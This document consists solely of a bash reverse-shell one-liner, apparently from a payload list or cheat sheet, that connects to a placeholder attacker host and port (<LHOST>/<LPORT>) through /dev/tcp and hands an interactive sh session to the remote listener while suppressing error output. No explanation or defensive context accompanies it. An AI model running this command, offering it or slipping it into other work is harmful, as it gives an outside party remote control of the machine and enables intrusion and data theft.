bash -c '0<&60-;exec 60<>/dev/tcp/<LHOST>/<LPORT>;sh <&60 >&60 2>&60' 2> /dev/null
